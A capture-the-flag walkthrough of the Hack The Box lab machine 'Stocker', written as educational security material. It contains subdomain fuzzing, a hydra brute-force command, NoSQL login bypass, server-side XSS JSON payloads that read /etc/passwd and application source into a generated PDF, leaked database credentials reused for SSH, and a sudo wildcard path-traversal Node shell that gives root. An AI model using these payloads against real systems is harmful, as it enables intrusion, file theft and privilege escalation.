---
title: "HTB - Stocker"
categories: [box]
date: 2023-12-26
comments: true
image: /images/walkthroughs/hackthebox/stocker/logo.png
favicon: /images/walkthroughs/hackthebox/stocker/logo.png
description: HTB - Stocker walkthrough
---

# Stocker


<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/banner.png" width="65%"/>
</p>


## Summary

Stocker is an easy box, where we find a website. There isn't much until we discover the **dev** subdomain. Once within it, we discover a login, vulnerable to NoSQL injection and inside the app, we see an "add to cart" functionallity that generated a PDF with the cart content. The PDF generation is vulnerable to Server Side XSS, so we can exfiltrate files from the server. Taking a look to some of those, we find credentials on the index.js, and those are reused by the user **angoose** spotted in the /etc/passwd file.

For the privesc, we can execute node with sudo on a wildcard path with the JS file extension. We create a file to execute /bin/sh with node and trick the wildcard to target that file. When executed with sudo, a root shell spawns.

<br>



## Enumeration


- nmap


```bash
Nmap scan report for 10.10.11.196
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


We see the port 22 and 80, with the redirection to a domain. Let's add stocker.htb to the /etc/hosts se we can see the webpage:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/1_0_web.png" width="80%"/>
</p>


Moving on, we enumerate the website paths:

- feroxbuster


```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://stocker.htb/
 🚀  Threads               │ 10
 📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      321l     1360w    15463c http://stocker.htb/
301      GET        7l       12w      178c http://stocker.htb/css => http://stocker.htb/css/
200      GET        1l        4w     1150c http://stocker.htb/favicon.ico
301      GET        7l       12w      178c http://stocker.htb/fonts => http://stocker.htb/fonts/
301      GET        7l       12w      178c http://stocker.htb/img => http://stocker.htb/img/
200      GET      321l     1360w    15463c http://stocker.htb/index.html
301      GET        7l       12w      178c http://stocker.htb/js => http://stocker.htb/js/
[####################] - 30s    23515/23515   0s      found:7       errors:0      
[####################] - 19s     4703/4703    240/s   http://stocker.htb/ 
[####################] - 19s     4703/4703    240/s   http://stocker.htb/css 
[####################] - 19s     4703/4703    240/s   http://stocker.htb/fonts 
[####################] - 19s     4703/4703    240/s   http://stocker.htb/img 
[####################] - 19s     4703/4703    240/s   http://stocker.htb/js

```

And the possible subdomains 

- ffuf

```bash
ffuf -c -u 'http://stocker.htb' -H 'Host: FUZZ.stocker.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/dns-Jhaddix.txt -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/  '     

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/dns-Jhaddix.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

 alpblog                [Status: 200, Size: 15463, Words: 4199, Lines: 322, Duration: 40ms]
dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 53ms]
```
<br>

We found the dev subdomain. Checking it out, we can spot a login webpage.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/1_1_dev.png" width="80%"/>
</p>


On the username we can see the placeholder jsmith

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/2_0_placeholder.png" width="70%"/>
</p>


I created a password list with cewl and with the page as input, no special setting was set. Let's use hydra with the curated wordlist and the POST to the login form to test our luck:

```bash
cewl http://stocker.htb/ > wordlist.txt

hydra -L users.ttx -P wordlist.txt dev.stocker.htb http-post-form "/login:username=^USER^&password=^PASS^:Invalid username or password:H=connect.sid=s%3A3pQ1Bj_servGywb4Y1Yl27UKb4HwJPnu.iFhrt531NyV78GcMSTtVH21nUkxoaVlX6heNMLySn7Q" -V

```


Another possible user:

```
"I can't wait for people to use our new site! It's so fast and easy to use! We're working hard to give you the best experience possible, and we're nearly ready for it to go live!"
Angoose Garden, Head of IT at Stockers Ltd. 
```

Seems like bruteforcing is not working. I moved into SQL injection and tested SQLMap over it, with no results. Then, testing for NoSQL injection it redirected me to the /stock endpoint. When doing manual testing I usually go for some usual payloads on SQLi and then, using the [Content-Type converter extension](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278) I set the login Content-Type to JSON. This way I can also test some basic NoSQLi payloads if the server accepts the type. In this case, it did and we could get into the website:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/3_0_no_sqli.png" width="80%"/>
</p>


Now we are in, we can see various products that we can add to the cart:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/4_0_stock.png" width="90%"/>
</p>

Checking how the cart works, we can see that is being stored locally in the browser since no requests were done:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/4_1_cart.png" width="90%"/>
</p>


When placing the order we can see an API request with the items and its data:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/4_2_order.png" width="90%"/>
</p>

Then an order ID is returned and we can use it to call the _/api/po/\<id\>_ endpoint to view our order (http://dev.stocker.htb/api/po/63d232d7762f93664528d975). It generates a PDF, so we will download it to check how the app is generating it. We will do it by inspecting the metadata:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/4_3_confirm.png" width="90%"/>
</p>

We can tell it is probably Moongose due to the \__v property: 
PDF:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/4_4_pdf.png" width="90%"/>
</p>


Using exiftool we can see the component **Skia/PDF m108**, this is the Chrome engine to render the PDFs, so I suppose that there might be a mechanism behind that it is rendering some kind of template then it exports the content of the PDF. 


```bash
exiftool 63d232d7762f93664528d975.pdf 
ExifTool Version Number         : 12.41
File Name                       : 63d232d7762f93664528d975.pdf
Directory                       : .
File Size                       : 39 KiB
File Modification Date/Time     : 2023:01:26 09:00:17+01:00
File Access Date/Time           : 2023:01:26 09:00:32+01:00
File Inode Change Date/Time     : 2023:01:26 09:00:32+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:01:26 08:00:00+00:00
Modify Date                     : 2023:01:26 08:00:00+00:00
```

SSTI payloads in Node.JS are not being executed, but since the server is rendering HTML code I tested an XSS injection and it displayed the payload:

```json
{
    "basket": [
        {
            "amount": 1,
            "currentStock": 4,
            "image": "red-cup.jpg",
            "price": 32,
            "_id": "638f116eeb060210cbd83a8d",
            "title": "<img src=x onerror=document.write('test') />",
            "description": "It's a red cup.",
            "__v": 0
        }
    ]
}
```

The PDF rendered the test word due to the execution of the script:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/5_1_xss.png" width="70%"/>
</p>

Digging depper about the vulnerability, we found the [following CTF writeup](https://lbherrera.github.io/lab/h1415-ctf-writeup.html). Also there is a [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) section for these kind of vulnerabilities. Let's try to exfiltrate /etc/passwd. 


```json
{
    "basket": [
        {
            "amount": 1,
            "currentStock": 4,
            "image": "red-cup.jpg",
            "price": 32,
            "_id": "638f116eeb060210cbd83a8d",
            "title": "<p style=\"width: 50%\"><script>x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};x.open(\"GET\",\"file:///etc/passwd\");x.send();</script></p>",
            "description": "It's a red cup.",
            "__v": 0
        }
    ]
}
```

We actually retrieve the /etc/passwd file but it is tructated due to the PDF size:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/5_2_etc.png" width="90%"/>
</p>


We might try to use other method rather than a raw output on the website, let's use an iframe for it to be rendered with line breaks:

```json
{
    "basket": [
        {
            "amount": 1,
            "currentStock": 4,
            "image": "red-cup.jpg",
            "price": 32,
            "_id": "638f116eeb060210cbd83a8d",
            "title": "<iframe width=\"500\" height=\"800\" src=file:///etc/passwd></iframe>",
            "description": "It's a red cup.",
            "__v": 0
        }
    ]
}
```

We retrieved the /etc/passwd file:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/5_4_good.png" width="90%"/>
</p>


And the location of the app:

```json
{
    "basket": [
        {
            "amount": 1,
            "currentStock": 4,
            "image": "red-cup.jpg",
            "price": 32,
            "_id": "638f116eeb060210cbd83a8d",
            "title": "<script> document.write(window.location) </script>",
            "description": "It's a red cup.",
            "__v": 0
        }
    ]
}
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/5_5_location.png" width="90%"/>
</p>

After some test looking for interesting files (mongo config, mongo logs...) I got the main JS file for express JS. I tried app.js and index.js, this last one got me the file:


```json
{
    "basket": [
        {
            "amount": 1,
            "currentStock": 4,
            "image": "red-cup.jpg",
            "price": 32,
            "_id": "638f116eeb060210cbd83a8d",
            "title": "<iframe width=\"500\" height=\"800\" src=file:///var/www/dev/index.js></iframe>",
            "description": "It's a red cup.",
            "__v": 0
        }
    ]
}
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/5_6_indexjs.png" width="90%"/>
</p>


A clear view of the code:


```js
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI =
"mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
 session({
 secret: randomBytes(32).toString("hex"),
 resave: false,
 saveUninitialized: true,
 store: MongoStore.create({
 mongoUrl: dbURI,
 }),
 })
);
app.use("/static", express.static(__dirname + "/assets"));
app.get("/", (req, res) => {
 return res.redirect("/login");
});
app.get("/api/products", async (req, res) => {
 if (!req.session.user) return res.json([]);
 const products = await mongoose.model("Product").find();
 return res.json(products);
});
app.get("/login", (req, res) => {
 if (req.session.user) return res.redirect("/stock");
 return res.sendFile(__dirname + "/templates/login.html");
});
app.post("/login", async (req, res) => {
 const { username, password } = req.body;
 if (!username || !password) return res.redirect("/login?");

```

We find these credentials:

**dev:IHeardPassphrasesArePrettySecure**

Reusing them on SSH got us the angoose user we previously saw on the /etc/passwd:

**angoose:IHeardPassphrasesArePrettySecure**

<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/6_0_user.png" width="70%"/>
</p>


## Privesc

First we run sudo -l to get to know if user can run any command as sudo (since we know its password we could use it):

```bash
sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js

```

<br>

We have the wildcard on the node command for JS files. We can create our own file on other directory and use a [GTFOBin for Node](https://gtfobins.github.io/gtfobins/node/#sudo). In that directory, we can see a set of files but we don't care becasue we can trick the pack with ../../. Let's go to the /tmp folder and create our file with the payload:

```bash
angoose@stocker:~$ cd /usr/local/scripts/
angoose@stocker:/usr/local/scripts$ nano k.js
angoose@stocker:/usr/local/scripts$ ls -la
total 32
drwxr-xr-x  3 root root 4096 Dec  6 10:33 .
drwxr-xr-x 11 root root 4096 Dec  6 10:33 ..
-rwxr-x--x  1 root root  245 Dec  6 09:53 creds.js
-rwxr-x--x  1 root root 1625 Dec  6 09:53 findAllOrders.js
-rwxr-x--x  1 root root  793 Dec  6 09:53 findUnshippedOrders.js
drwxr-xr-x  2 root root 4096 Dec  6 10:33 node_modules
-rwxr-x--x  1 root root 1337 Dec  6 09:53 profitThisMonth.js
-rwxr-x--x  1 root root  623 Dec  6 09:53 schema.js
```


Create the file to spawn a shell (sh) in Node.JS and execute it:

```bash
angoose@stocker:/tmp$ nano k.js
angoose@stocker:/tmp$ cat k.js 
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
angoose@stocker:/tmp$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/k.js
\# id
uid=0(root) gid=0(root) groups=0(root)

```

And we have root:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/stocker/7_0_root.png" width="90%"/>
</p>